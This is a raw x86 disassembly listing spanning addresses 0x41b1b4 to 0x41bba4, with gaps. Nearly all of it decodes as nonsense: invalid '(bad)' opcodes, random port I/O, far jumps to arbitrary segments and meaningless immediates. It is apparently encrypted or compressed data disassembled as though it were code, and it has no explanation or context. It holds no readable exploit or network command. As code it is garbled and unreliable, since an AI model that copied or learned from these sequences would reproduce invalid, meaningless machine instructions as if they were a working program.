  41b1b4:	mov    ebp,0x0
	...
  41b215:	add    BYTE PTR [esi+0x6be069a5],cl
  41b21b:	in     al,dx
  41b21c:	(bad)  
  41b21d:	out    dx,eax
  41b21e:	arpl   WORD PTR [edi-0x53],sp
  41b221:	aas    
  41b222:	or     al,0x30
  41b224:	in     al,dx
  41b225:	out    dx,eax
  41b226:	or     BYTE PTR [esi],bl
  41b228:	add    DWORD PTR [eax],eax
  41b22a:	pop    es
  41b22b:	add    DWORD PTR [eax],eax
  41b22d:	add    bl,dh
  41b22f:	loop   0x41b202
  41b231:	aaa    
  41b232:	imul   esi,DWORD PTR ds:0x9a96c96,0xffffff91
  41b239:	pop    es
  41b23a:	jbe    0x41b1ff
  41b23c:	jo     0x41b1d2
  41b23e:	lds    eax,FWORD PTR [bx+di-0x42]
  41b242:	lods   eax,DWORD PTR ds:[esi]
  41b243:	retf   0xdbd1
  41b246:	push   edx
  41b247:	mov    esi,0xecf0dca0
  41b24c:	fs pop ebp
  41b24e:	stc    
  41b24f:	rcr    eax,1
  41b251:	push   0x9fcbe71
  41b256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b257:	mov    dh,BYTE PTR [edi-0x5c]
  41b25a:	lock pushf 
  41b25c:	adc    DWORD PTR [eax],0x688beb35
  41b262:	adc    eax,0x47de8fb8
  41b268:	in     eax,dx
  41b269:	cmp    al,0xcb
  41b26b:	add    ecx,DWORD PTR [esi-0x3bbdb2fe]
  41b271:	and    BYTE PTR [edx+0x1c2a512e],dh
  41b277:	jne    0x41b2d0
  41b279:	or     DWORD PTR [edx],ecx
  41b27b:	jns    0x41b267
  41b27d:	inc    esi
  41b27e:	pop    ds
  41b27f:	cmp    al,al
  41b281:	mov    bl,0x7
  41b283:	xor    eax,DWORD PTR [ebp+0x77d1eccf]
  41b289:	inc    esp
  41b28a:	pop    eax
  41b28b:	cdq    
  41b28c:	out    dx,al
  41b28d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b28e:	(bad)  [ebp+0xa]
  41b291:	es mov esp,0xa8ae1444
  41b297:	or     BYTE PTR [edi],bl
  41b299:	pop    ebp
  41b29a:	(bad)  [ebp+0x15]
  41b29d:	mov    WORD PTR [esp+edx*4],gs
  41b2a0:	sub    al,0x1e
  41b2a2:	out    dx,eax
  41b2a3:	pop    ebx
  41b2a4:	jb     0x41b237
  41b2a6:	jmp    0xeda94677
  41b2ab:	clc    
  41b2ac:	inc    esp
  41b2ad:	jecxz  0x41b29a
  41b2af:	pop    ebp
  41b2b0:	dec    esi
  41b2b1:	(bad)  
  41b2b2:	stc    
  41b2b3:	in     al,0x7d
  41b2b5:	add    eax,0x3388deea
  41b2ba:	mov    ds:0x624512b1,al
  41b2bf:	adc    ebp,DWORD PTR [esi-0x6aa74137]
  41b2c5:	int    0xf1
  41b2c7:	mov    bh,BYTE PTR [eax+eax*8]
  41b2ca:	mov    WORD PTR [ebp+esi*1-0x40],cs
  41b2ce:	xor    eax,0x8ca651b5
  41b2d3:	adc    cl,bh
  41b2d5:	pop    es
  41b2d6:	adc    ecx,ebx
  41b2d8:	mov    ebp,0xdeb278fc
  41b2dd:	test   BYTE PTR [ecx+ecx*4+0x6c],dh
  41b2e1:	and    ch,BYTE PTR [eax+0x5d]
  41b2e4:	js     0x41b26e
  41b2e6:	cmp    eax,0x815cabf7
  41b2eb:	dec    esi
  41b2ec:	push   edx
  41b2ed:	repz and bl,al
  41b2f0:	sar    BYTE PTR [ecx+0x70],cl
  41b2f3:	in     eax,0x1d
  41b2f5:	push   ebp
  41b2f6:	lahf   
  41b2f7:	xor    DWORD PTR [eax+edi*8],ebp
  41b2fa:	stos   BYTE PTR es:[edi],al
  41b2fb:	dec    edx
  41b2fc:	fcom   st(5)
  41b2fe:	and    BYTE PTR [edi],0x36
  41b301:	or     bh,BYTE PTR [edx-0x17ef10df]
  41b307:	mov    dl,0xee
  41b309:	frndint 
  41b30b:	mov    ebp,DWORD PTR [esi]
  41b30d:	add    BYTE PTR [edi+0x28],cl
  41b310:	test   al,0x3f
  41b312:	std    
  41b313:	xchg   edx,eax
  41b314:	fs (bad) 
  41b317:	(bad)  
  41b319:	pop    esi
  41b31a:	and    al,0xbd
  41b31c:	mov    esi,ecx
  41b31e:	adc    eax,0x652a114e
  41b323:	sub    ch,dh
  41b325:	pop    ss
  41b326:	test   cl,0x35
  41b329:	pop    ecx
  41b32a:	push   ecx
  41b32b:	in     al,0xda
  41b32d:	nop
  41b32e:	js     0x41b32e
  41b330:	add    al,0xa4
  41b332:	mov    esp,0x83bc
	...
  41b393:	add    BYTE PTR [eax],al
  41b395:	add    BYTE PTR [eax+0xd],cl
  41b398:	sbb    eax,0xfebb5dab
  41b39d:	out    dx,eax
  41b39e:	cld    
  41b39f:	(bad)  
  41b3a0:	mov    ?,eax
  41b3a2:	sar    DWORD PTR [ebp-0x38],cl
  41b3a5:	dec    ebp
  41b3a6:	nop    DWORD PTR [ecx]
  41b3a9:	add    BYTE PTR [edi],al
  41b3ab:	add    DWORD PTR [eax],eax
  41b3ad:	add    BYTE PTR [ebp+0x12],bh
  41b3b0:	call   0x6ba1:0x88399790
  41b3b7:	and    ebx,DWORD PTR [esi-0x38d700f]
  41b3bd:	sub    al,0xda
  41b3bf:	mov    esi,0x83a65bb0
  41b3c4:	shl    esp,0x2c
  41b3c7:	sub    eax,0x25993f96
  41b3cc:	ret    0xf5b0
  41b3cf:	xor    dh,BYTE PTR [esi]
  41b3d1:	mov    esi,0xbea0c421
  41b3d6:	loope  0x41b3bf
  41b3d8:	or     al,0x7
  41b3da:	xchg   ebx,eax
  41b3db:	inc    ecx
  41b3dc:	into   
  41b3dd:	rcr    BYTE PTR [edx+0x22479963],0x9f
  41b3e4:	sub    ah,BYTE PTR [esi+0x1f]
  41b3e7:	mov    DWORD PTR [ecx+0x1f74c3d1],esi
  41b3ed:	iret   
  41b3ee:	inc    ebx
  41b3ef:	test   DWORD PTR [eax-0x7c12f2cf],ebp
  41b3f5:	enter  0x4956,0xce
  41b3f9:	and    BYTE PTR [ebp+0x212645da],0x57
  41b400:	xchg   esp,eax
  41b401:	(bad)  
  41b403:	jo     0x41b426
  41b405:	cmp    BYTE PTR [edi-0x48f98e93],bh
  41b40b:	das    
  41b40c:	jns    0x41b452
  41b40e:	xchg   esp,esi
  41b410:	pop    edx
  41b411:	sahf   
  41b412:	pop    ebx
  41b413:	mov    DWORD PTR [ebx],edx
  41b415:	(bad)  
  41b417:	add    ch,BYTE PTR [eax]
  41b419:	pop    ebx
  41b41a:	and    BYTE PTR [eax],0xe3
  41b41d:	inc    edx
  41b41e:	sahf   
  41b41f:	ds ja  0x41b3c7
  41b422:	push   edx
  41b423:	in     al,dx
  41b424:	sbb    al,0xa4
  41b426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b427:	dec    esi
  41b428:	or     eax,0xb9d55c2a
  41b42d:	std    
  41b42e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b42f:	xchg   dh,al
  41b431:	(bad)
  41b434:	mov    ds:0x32bb6dc1,eax
  41b439:	arpl   WORD PTR [eax],sp
  41b43b:	shl    ebx,0x19
  41b43e:	(bad)  
  41b43f:	fsubr  QWORD PTR [edi+eax*4-0x3b]
  41b443:	call   0x4ba0:0xc3adc970
  41b44a:	(bad)  
  41b44b:	sub    cl,dh
  41b44d:	mov    ah,0x36
  41b44f:	jge    0x41b49f
  41b451:	sahf   
  41b452:	sbb    dl,BYTE PTR [ebp-0x60]
  41b455:	sti    
  41b456:	push   0xffffffae
  41b458:	sbb    eax,0x1058e9e2
  41b45d:	xor    eax,0xff622cc7
  41b462:	sub    al,0x72
  41b464:	or     ebx,DWORD PTR [ebp+0x5]
  41b467:	std    
  41b468:	xchg   edx,eax
  41b469:	cs adc al,0x88
  41b46c:	rcr    DWORD PTR [edx+0x6ed08126],1
  41b472:	aam    0xb6
  41b474:	mov    dl,dl
  41b476:	add    ecx,eax
  41b478:	cmp    eax,0x2d5d5a20
  41b47d:	cmp    DWORD PTR [esi],esi
  41b47f:	sbb    al,0xa3
  41b481:	sub    al,0x17
  41b483:	mov    ebp,0xe7a6ea26
  41b488:	adc    al,0x59
  41b48a:	inc    esi
  41b48b:	out    0x17,eax
  41b48d:	sub    DWORD PTR [esi+0x15b64b58],edi
  41b493:	pop    ecx
  41b494:	or     ebx,DWORD PTR [ecx+esi*8+0x386ddaa5]
  41b49b:	push   esp
  41b49c:	sbb    ch,BYTE PTR [ebp+0x17352812]
  41b4a2:	inc    eax
  41b4a3:	out    dx,eax
  41b4a4:	pop    eax
  41b4a5:	in     al,0x5b
  41b4a7:	xor    ch,BYTE PTR [esi-0x4ac7d9df]
  41b4ad:	popa   
  41b4ae:	les    ebp,FWORD PTR [edx+0x50790abf]
  41b4b4:	popa   
	...
  41b515:	add    ah,dl
  41b517:	in     al,dx
  41b518:	add    edi,edi
  41b51a:	cmp    edi,edi
  41b51c:	(bad)  
  41b51d:	out    dx,eax
  41b51e:	lock add DWORD PTR [ebp-0x3c],ebp
  41b522:	cwde   
  41b523:	dec    eax
  41b524:	in     al,dx
  41b525:	push   esi
  41b526:	push   ss
  41b527:	and    BYTE PTR [ecx],al
  41b529:	add    BYTE PTR [edi],al
  41b52b:	add    DWORD PTR [eax],eax
  41b52d:	add    dl,cl
  41b52f:	call   0x975:0x70a35754
  41b536:	push   ds
  41b537:	je     0x41b5b7
  41b539:	mov    eax,0x6ec36c79
  41b53e:	xor    al,BYTE PTR [edi-0x3e]
  41b541:	push   cs
  41b542:	mov    ah,0x75
  41b544:	inc    ebp
  41b545:	sub    DWORD PTR fs:[ecx],esi
  41b548:	call   0xefc128fe
  41b54d:	rcl    BYTE PTR [esi],1
  41b54f:	jnp    0x41b5ce
  41b551:	jl     0x41b598
  41b553:	imul   ebp,DWORD PTR [esi+0x73b63ae2],0xb
  41b55a:	pop    esp
  41b55b:	mov    ebx,0xb19813d4
  41b560:	test   eax,0x4bf5f05f
  41b565:	adc    BYTE PTR [esi],bh
  41b567:	scas   al,BYTE PTR es:[edi]
  41b568:	(bad)  
  41b569:	and    al,0xe9
  41b56b:	jl     0x41b56b
  41b56d:	mul    edi
  41b56f:	aaa    
  41b570:	mov    edx,0x48eddb75
  41b575:	ror    dh,0x59
  41b578:	pop    ds
  41b579:	jmp    0x41b51a
  41b57b:	call   DWORD PTR [ebp+edi*2-0x568a5247]
  41b582:	(bad)  
  41b583:	push   ss
  41b584:	int    0x8c
  41b586:	fwait
  41b587:	xlat   BYTE PTR ds:[ebx]
  41b588:	sahf   
  41b589:	rcr    DWORD PTR [ecx+esi*4-0x2],1
  41b58d:	xchg   edi,eax
  41b58e:	mov    edx,0xbb2f961c
  41b593:	and    ebp,esi
  41b595:	sub    eax,0x90df510f
  41b59a:	pop    ebp
  41b59b:	dec    esi
  41b59c:	sub    al,BYTE PTR [eax]
  41b59e:	div    BYTE PTR [ecx]
  41b5a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5a1:	dec    edx
  41b5a2:	enter  0x8c5b,0x30
  41b5a6:	dec    edx
  41b5a7:	setns  ah
  41b5aa:	loop   0x41b536
  41b5ac:	jp     0x41b5c8
  41b5ae:	seta   BYTE PTR [ecx+0x79754ccd]
  41b5b5:	loopne 0x41b5fb
  41b5b7:	xor    bh,BYTE PTR [ebx]
  41b5b9:	and    ebp,eax
  41b5bb:	jecxz  0x41b5e9
  41b5bd:	repz mov es,WORD PTR [ebx]
  41b5c0:	or     BYTE PTR [esi+ebx*1-0x5ccf355],bh
  41b5c7:	jo     0x41b58d
  41b5c9:	or     eax,edx
  41b5cb:	or     al,0x18
  41b5cd:	popa   
  41b5ce:	popf   
  41b5cf:	jmp    0xbb62f733
  41b5d4:	push   ebp
  41b5d5:	int    0x50
  41b5d7:	imul   ebp,DWORD PTR [ecx-0x533dcfd2],0x4ddbb0a3
  41b5e1:	inc    ebp
  41b5e2:	(bad)  
  41b5e5:	mov    bl,0x42
  41b5e7:	pop    eax
  41b5e8:	xor    DWORD PTR ds:0x81100d63,0xb6526238
  41b5f2:	sti    
  41b5f3:	sahf   
  41b5f4:	xchg   edx,eax
  41b5f5:	push   ss
  41b5f6:	imul   edi,DWORD PTR [ebp-0x71],0xfd94370b
  41b5fd:	jo     0x41b618
  41b5ff:	push   es
  41b600:	sbb    dl,BYTE PTR [edx]
  41b602:	add    BYTE PTR [esi+0x31],0xcb
  41b606:	inc    edi
  41b607:	test   dh,dh
  41b609:	jl     0x41b5e7
  41b60b:	in     eax,0x15
  41b60d:	imul   edx,DWORD PTR [edi],0xa09564b7
  41b613:	sbb    bl,BYTE PTR [edi+0x49be29bf]
  41b619:	sub    DWORD PTR [ebx-0x7d],edx
  41b61c:	jp     0x41b5b1
  41b61e:	mov    WORD PTR [ebx-0x66],?
  41b621:	retf   0xc9d0
  41b624:	and    ch,al
  41b626:	not    DWORD PTR [ebp-0x6735e646]
  41b62c:	fstp   TBYTE PTR [ecx+0x5ea0ed64]
  41b632:	mov    ss,esp
  41b634:	dec    eax
	...
  41b695:	add    BYTE PTR [eax-0x2469e49d],ch
  41b69b:	(bad)  
  41b69c:	lods   eax,DWORD PTR ds:[esi]
  41b69d:	jg     0x41b6db
  41b69f:	sub    al,dl
  41b6a1:	add    BYTE PTR [esi+0x49],al
  41b6a4:	pop    es
  41b6a5:	les    ebx,FWORD PTR ds:0x7000121
  41b6ab:	add    DWORD PTR [eax],eax
  41b6ad:	add    BYTE PTR [eax],ch
  41b6af:	outs   dx,BYTE PTR ds:[esi]
  41b6b0:	xchg   DWORD PTR ds:0x2389b1c4,esp
  41b6b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6b7:	mov    dl,0xf5
  41b6b9:	int3   
  41b6ba:	retf   
  41b6bb:	or     eax,0x4088cc7b
  41b6c0:	lods   al,BYTE PTR ds:[esi]
  41b6c1:	scas   al,BYTE PTR es:[edi]
  41b6c2:	add    al,0xaf
  41b6c4:	xchg   DWORD PTR ds:0x3aa5ca9f,eax
  41b6ca:	xchg   edi,eax
  41b6cb:	dec    esp
  41b6cc:	xor    BYTE PTR [eax+0x24],ch
  41b6cf:	daa    
  41b6d0:	ja     0x41b726
  41b6d2:	adc    DWORD PTR [edi-0x18],edx
  41b6d5:	push   ds
  41b6d6:	aam    0x31
  41b6d8:	push   0x1c8390fa
  41b6dd:	cld    
  41b6de:	inc    ebx
  41b6df:	ret    
  41b6e0:	mov    dl,0xdd
  41b6e2:	das    
  41b6e3:	aad    0xcb
  41b6e5:	dec    ebp
  41b6e6:	push   cs
  41b6e7:	adc    eax,edx
  41b6e9:	fs mov edi,0x811161fc
  41b6ef:	ret    
  41b6f0:	jmp    0x2bae4c29
  41b6f5:	mov    dl,0x71
  41b6f7:	xchg   ecx,eax
  41b6f8:	shl    BYTE PTR [ecx],cl
  41b6fa:	inc    edi
  41b6fb:	fistp  DWORD PTR [ecx-0x3d]
  41b6fe:	mov    DWORD PTR [ebp+0x6fbb7cab],edi
  41b704:	dec    edx
  41b705:	dec    esp
  41b706:	xchg   BYTE PTR [edi+0x324e9ba1],ah
  41b70c:	es nop
  41b70e:	adc    dh,BYTE PTR [eax]
  41b710:	les    ebx,FWORD PTR [edi-0x3c1943ee]
  41b716:	sub    BYTE PTR gs:[ebx+0x25],ah
  41b71a:	and    BYTE PTR ds:[eax],dl
  41b71d:	nop
  41b71e:	iret   
  41b71f:	arpl   cx,si
  41b721:	jecxz  0x41b71e
  41b723:	push   esp
  41b724:	pushf  
  41b725:	pop    edi
  41b726:	mov    ebp,0xe45896a0
  41b72b:	cmc    
  41b72c:	jmp    0x41b74a
  41b72e:	inc    ecx
  41b72f:	enter  0x184d,0xb1
  41b733:	int    0x18
  41b735:	fs inc eax
  41b737:	mov    dh,BYTE PTR [ebx-0x70ec746c]
  41b73d:	xlat   BYTE PTR ds:[ebx]
  41b73e:	dec    ebx
  41b73f:	xchg   edx,eax
  41b740:	jb     0x41b6e9
  41b742:	hlt    
  41b743:	clc    
  41b744:	push   edi
  41b745:	inc    edi
  41b746:	in     eax,dx
  41b747:	xlat   BYTE PTR ds:[ebx]
  41b748:	popa   
  41b749:	add    ch,BYTE PTR [eax]
  41b74b:	(bad)  
  41b74c:	outs   dx,DWORD PTR ds:[esi]
  41b74d:	call   0x3f9b:0x28a20027
  41b754:	lods   eax,DWORD PTR ds:[esi]
  41b755:	pop    ds
  41b756:	sar    DWORD PTR [ebx+0x295b617e],cl
  41b75c:	mov    al,0xef
  41b75e:	ficomp WORD PTR [edx+0x4c]
  41b761:	fst    st(3)
  41b763:	mov    edi,0xa04cb8fe
  41b768:	mov    edx,0x28255343
  41b76d:	daa    
  41b76e:	leave  
  41b76f:	int3   
  41b770:	(bad)  [esi-0x1dc6e6f]
  41b776:	int3   
  41b777:	cmc    
  41b778:	inc    eax
  41b779:	mov    ah,0x23
  41b77b:	in     al,0x57
  41b77d:	push   esi
  41b77e:	add    al,0xd0
  41b780:	sub    DWORD PTR [eax-0x56],0x70d5cb8c
  41b787:	xchg   DWORD PTR [esi+0x60],edx
  41b78a:	adc    edi,DWORD PTR [edi+0x2a]
  41b78d:	repnz in al,dx
  41b78f:	inc    edi
  41b790:	(bad)  
  41b791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b792:	jmp    0xa563a64b
  41b797:	into   
  41b798:	push   esp
  41b799:	dec    ecx
  41b79a:	clc    
  41b79b:	pop    ebx
  41b79c:	mov    ah,0x17
  41b79e:	out    0x24,eax
  41b7a0:	xchg   edi,eax
  41b7a1:	inc    esi
  41b7a2:	jne    0x41b7cf
  41b7a4:	dec    edx
  41b7a5:	fiadd  WORD PTR [eax+edx*1]
  41b7a8:	leave  
  41b7a9:	jbe    0x41b7ad
  41b7ab:	pop    esp
  41b7ac:	imul   eax,DWORD PTR [ecx],0xf90cf812
  41b7b2:	imul   edi,esp,0x27
	...
  41b814:	add    BYTE PTR [eax],al
  41b816:	mov    bh,ah
  41b818:	(bad)  
  41b819:	dec    esi
  41b81a:	idiv   DWORD PTR [edi-0x75]
  41b81d:	cld    
  41b81e:	fcmovbe st,st(0)
  41b820:	(bad)  
  41b821:	out    0x19,al
  41b823:	xchg   ebx,eax
  41b824:	push   0x1222463
  41b829:	add    BYTE PTR [edi],al
  41b82b:	add    DWORD PTR [eax],eax
  41b82d:	add    BYTE PTR [ecx],bl
  41b82f:	in     al,0x31
  41b831:	test   BYTE PTR [ecx+0xd1af7d2],0xa6
  41b838:	xlat   BYTE PTR ds:[ebx]
  41b839:	inc    edx
  41b83a:	pop    ds
  41b83b:	popa   
  41b83c:	cmp    eax,0x7becd1aa
  41b841:	fistp  WORD PTR [edx]
  41b843:	das    
  41b844:	xor    al,0xc3
  41b846:	stos   BYTE PTR es:[edi],al
  41b847:	shl    BYTE PTR [edi+edi*4],1
  41b84a:	pop    esi
  41b84b:	in     eax,0xc
  41b84d:	gs sti 
  41b84f:	dec    ecx
  41b850:	mov    dh,0xc
  41b852:	xchg   ebp,eax
  41b853:	pop    ss
  41b854:	jnp    0x41b8a5
  41b856:	cmp    eax,0x788b7e9b
  41b85b:	js     0x41b899
  41b85d:	mov    edi,0x147fe451
  41b862:	jmp    0x1ae5a9a8
  41b867:	out    0xd9,eax
  41b869:	cmp    eax,0x5a693b16
  41b86e:	jmp    0x56ad:0x4a62c961
  41b875:	out    0xe1,eax
  41b877:	retf   0x3545
  41b87a:	ds pop edx
  41b87c:	mov    ebx,0xb49b3a6c
  41b881:	popa   
  41b882:	jp     0x41b8d1
  41b884:	ins    BYTE PTR es:[edi],dx
  41b885:	adc    BYTE PTR [esi],ah
  41b887:	xchg   edx,eax
  41b888:	jns    0x41b84e
  41b88a:	pop    ds
  41b88b:	cmp    bh,BYTE PTR [ebx]
  41b88d:	hlt    
  41b88e:	or     BYTE PTR [edi],ch
  41b890:	inc    esp
  41b891:	cmp    esi,DWORD PTR [ebp-0x68]
  41b894:	push   ebp
  41b895:	mov    al,0x5d
  41b897:	xchg   edi,eax
  41b898:	aad    0xcd
  41b89a:	adc    BYTE PTR [ecx-0x1cdcfab6],0x9f
  41b8a1:	push   es
  41b8a2:	mov    ah,0x4a
  41b8a4:	pop    esi
  41b8a5:	out    0x80,al
  41b8a7:	loop   0x41b8a9
  41b8a9:	and    edi,esp
  41b8ab:	push   ebx
  41b8ac:	inc    ebp
  41b8ad:	add    cl,BYTE PTR [ebp+0x41]
  41b8b0:	in     eax,0x90
  41b8b2:	lds    ebp,FWORD PTR [ecx+0x53]
  41b8b5:	rcl    BYTE PTR [ecx+0x2bcc46b8],1
  41b8bb:	xor    DWORD PTR [edi],ecx
  41b8bd:	jns    0x41b8b7
  41b8bf:	add    bh,BYTE PTR [ecx-0x7bbbac35]
  41b8c5:	outs   dx,BYTE PTR ds:[esi]
  41b8c6:	test   eax,0x3b16862d
  41b8cb:	lea    ecx,[edi-0x9]
  41b8ce:	xlat   BYTE PTR ds:[ebx]
  41b8cf:	push   edi
  41b8d0:	inc    ebp
  41b8d1:	(bad)  
  41b8d2:	ret    
  41b8d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8d4:	out    dx,eax
  41b8d5:	dec    edx
  41b8d6:	loop   0x41b894
  41b8d8:	test   DWORD PTR [ebx+0x4ac5f07b],ebp
  41b8de:	les    edx,FWORD PTR ds:0xb6da5d1d
  41b8e4:	xchg   edi,eax
  41b8e5:	jl     0x41b8b5
  41b8e7:	jno    0x41b8e5
  41b8e9:	mov    esi,0x5ba06f35
  41b8ee:	or     al,ah
  41b8f0:	neg    BYTE PTR [edi+0x56]
  41b8f3:	loop   0x41b893
  41b8f5:	out    0x3e,eax
  41b8f7:	sar    BYTE PTR [ebp-0x2f],1
  41b8fa:	cmc    
  41b8fb:	or     al,0xb6
  41b8fd:	lahf   
  41b8fe:	test   eax,0x5778b3bc
  41b903:	outs   dx,BYTE PTR ds:[esi]
  41b904:	fcom   DWORD PTR [edx]
  41b906:	add    DWORD PTR [edx-0x71],edi
  41b909:	mov    edi,DWORD PTR [ebx+edi*2-0x471cf4a9]
  41b910:	cdq    
  41b911:	je     0x41b98a
  41b913:	sub    ebp,0xbd5388e8
  41b919:	jae    0x41b8af
  41b91b:	pusha  
  41b91c:	les    ecx,FWORD PTR [esi+0x79]
  41b91f:	jns    0xe8dba8d6
  41b925:	jae    0x41b90f
  41b927:	loop   0x41b982
  41b929:	ins    BYTE PTR es:[edi],dx
  41b92a:	pop    edi
  41b92b:	sub    esi,edi
  41b92d:	iret   
  41b92e:	ficomp DWORD PTR [esi]
  41b930:	sub    eax,0xad0dc463
	...
  41b995:	add    bl,al
  41b997:	mov    esp,0xf87f4844
  41b99c:	iret   
  41b99d:	mov    edi,0x51d578ae
  41b9a2:	hlt    
  41b9a3:	repnz or DWORD PTR cs:[ebx],ebp
  41b9a7:	and    eax,DWORD PTR [ecx]
  41b9a9:	add    BYTE PTR [edi],al
  41b9ab:	add    DWORD PTR [eax],eax
  41b9ad:	add    BYTE PTR [edi],cl
  41b9af:	in     eax,dx
  41b9b0:	adc    DWORD PTR [edi+0x4a8abbd7],esi
  41b9b6:	ss xor al,0xe7
  41b9b9:	scas   al,BYTE PTR es:[edi]
  41b9ba:	nop
  41b9bb:	stos   DWORD PTR es:[edi],eax
  41b9bc:	mov    esp,0xb12fc90f
  41b9c1:	sti    
  41b9c2:	not    edi
  41b9c4:	pusha  
  41b9c5:	add    eax,0xced9d3a4
  41b9ca:	stc    
  41b9cb:	ror    ecx,0x8a
  41b9ce:	sub    al,0xff
  41b9d0:	fs scas al,BYTE PTR es:[edi]
  41b9d2:	in     eax,0x6a
  41b9d4:	sbb    al,0x9f
  41b9d6:	cmc    
  41b9d7:	jecxz  0x41ba44
  41b9d9:	xchg   ecx,eax
  41b9da:	xor    eax,0xd799ba85
  41b9df:	mov    ecx,0x61533023
  41b9e4:	push   esi
  41b9e5:	sbb    DWORD PTR [esi-0xd],ecx
  41b9e8:	mov    dh,0xdf
  41b9ea:	xor    ebx,esi
  41b9ec:	fwait
  41b9ed:	shl    ch,cl
  41b9ef:	jb     0x41b9b9
  41b9f1:	cmp    eax,0x2e7bc011
  41b9f6:	stc    
  41b9f7:	(bad)  
  41b9f8:	mov    dl,0xfd
  41b9fa:	sbb    al,0xb3
  41b9fc:	xor    DWORD PTR [edx+0x192efe8e],eax
  41ba02:	sar    edi,1
  41ba04:	mov    DWORD PTR [edx],eax
  41ba06:	xor    eax,0xc936dc1d
  41ba0b:	lods   al,BYTE PTR ds:[esi]
  41ba0c:	xor    al,0x2c
  41ba0e:	jno    0x41b9a7
  41ba10:	mov    BYTE PTR [esi],cl
  41ba12:	push   esi
  41ba13:	(bad)  
  41ba14:	jecxz  0x41ba20
  41ba16:	mov    BYTE PTR [esi-0x68],cl
  41ba19:	add    eax,eax
  41ba1b:	into   
  41ba1c:	out    dx,al
  41ba1d:	imul   esp,DWORD PTR [ebx+0x7e],0xffffff94
  41ba21:	adc    edx,DWORD PTR [eax-0x6a]
  41ba24:	(bad)  
  41ba25:	jg     0x41b9c3
  41ba27:	cdq    
  41ba28:	cmp    eax,0x7c64a8a8
  41ba2d:	popaw  
  41ba2f:	cmp    eax,0xeb91d638
  41ba34:	xor    eax,0x8279e0c9
  41ba39:	push   eax
  41ba3a:	pop    ss
  41ba3b:	ja     0x41ba61
  41ba3d:	jmp    0xffb1:0x92b14663
  41ba44:	mov    edi,ebx
  41ba46:	stos   BYTE PTR es:[edi],al
  41ba47:	pop    esi
  41ba48:	outs   dx,BYTE PTR ds:[esi]
  41ba49:	or     al,0x7
  41ba4b:	dec    edx
  41ba4c:	cld    
  41ba4d:	jle    0x41ba54
  41ba4f:	and    DWORD PTR [ebx+0x31],eax
  41ba52:	sahf   
  41ba53:	mov    esp,0xb99663f3
  41ba58:	adc    DWORD PTR [esp+ebx*4-0x4cb3d94a],0xe0a3f999
  41ba63:	loopne 0x41ba97
  41ba65:	(bad)  [edi]
  41ba67:	sbb    ch,0x2
  41ba6a:	jmp    0x41baa0
  41ba6c:	scas   al,BYTE PTR es:[edi]
  41ba6d:	mov    ch,0x30
  41ba6f:	inc    edx
  41ba70:	scas   eax,DWORD PTR es:[edi]
  41ba71:	sub    eax,0x2185e38
  41ba76:	jno    0x41ba45
  41ba78:	icebp  
  41ba79:	bnd jp 0x41ba37
  41ba7c:	xchg   edx,eax
  41ba7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba7e:	add    ebx,DWORD PTR [ebx-0x1b]
  41ba81:	fs (bad) 
  41ba83:	push   esi
  41ba84:	nop
  41ba85:	pop    esi
  41ba86:	ret    
  41ba87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba88:	pop    esp
  41ba89:	mov    cl,0x1
  41ba8b:	pop    si
  41ba8d:	retf   
  41ba8e:	and    edi,DWORD PTR [ecx-0x5c129b95]
  41ba94:	out    dx,al
  41ba95:	sbb    cl,bl
  41ba97:	inc    ecx
  41ba98:	arpl   WORD PTR ds:0x42cbcb2b,ax
  41ba9e:	(bad)  
  41ba9f:	iret   
  41baa0:	lds    ebp,FWORD PTR [ebp-0x4002d3b]
  41baa6:	(bad)  
  41baa8:	fidiv  DWORD PTR [esi]
  41baaa:	out    0x2a,al
  41baac:	xor    DWORD PTR cs:[edx+edi*8+0x5685c91d],0x7a
	...
  41bb15:	add    BYTE PTR [edx],cl
  41bb17:	mov    eax,0xbfb7aaa5
  41bb1c:	(bad)  
  41bb1e:	lahf   
  41bb1f:	and    esp,DWORD PTR [ebx-0x56]
  41bb22:	cld    
  41bb23:	mov    dl,0x9a
  41bb25:	loop   0x41bb59
  41bb27:	and    al,0x1
  41bb29:	add    BYTE PTR [edi],al
  41bb2b:	add    DWORD PTR [eax],eax
  41bb2d:	add    BYTE PTR [ebp+0x62b4b812],dl
  41bb33:	xor    ebx,ecx
  41bb35:	xlat   BYTE PTR ds:[ebx]
  41bb36:	xchg   esp,eax
  41bb37:	outs   dx,BYTE PTR ds:[esi]
  41bb38:	loop   0x41bb44
  41bb3a:	repnz ss xor al,0x5a
  41bb3e:	add    eax,0xf6706a3e
  41bb43:	push   0xffffff97
  41bb45:	sar    DWORD PTR [eax-0x5ad7bc7e],1
  41bb4b:	repz add eax,0x2d301a00
  41bb51:	jg     0x41bb1c
  41bb53:	pop    ecx
  41bb54:	xor    edx,DWORD PTR [ebx+0x4e]
  41bb57:	fidiv  DWORD PTR [edi+0x1e]
  41bb5a:	mov    BYTE PTR [ebx],dh
  41bb5c:	sub    ebp,edi
  41bb5e:	mov    eax,ds:0xcbe7b378
  41bb63:	fwait
  41bb64:	mov    al,ds:0x2779868
  41bb69:	sbb    BYTE PTR [ebx],0xd5
  41bb6c:	test   BYTE PTR [ebp+0x6a],0xac
  41bb70:	outs   dx,DWORD PTR ds:[esi]
  41bb71:	dec    esp
  41bb72:	and    ebx,DWORD PTR [eax-0x6a]
  41bb75:	mov    esp,0xa9a3b6bb
  41bb7a:	mov    ebp,0xf0859faa
  41bb7f:	mov    ds:0x97b92679,eax
  41bb84:	pop    edi
  41bb85:	jecxz  0x41bb6d
  41bb87:	out    dx,eax
  41bb88:	ss or  al,0xb
  41bb8b:	cmp    BYTE PTR [ebx],ch
  41bb8d:	jge    0x41bbc2
  41bb8f:	push   edx
  41bb90:	and    al,0x5b
  41bb92:	jb     0x41bb25
  41bb94:	push   0x1fc5422f
  41bb99:	sub    eax,0x92ea2afa
  41bb9e:	adc    BYTE PTR [ecx+0x2c0f077a],cl
  41bba4:	sar    BYTE PTR [eax+0x610f7465],cl
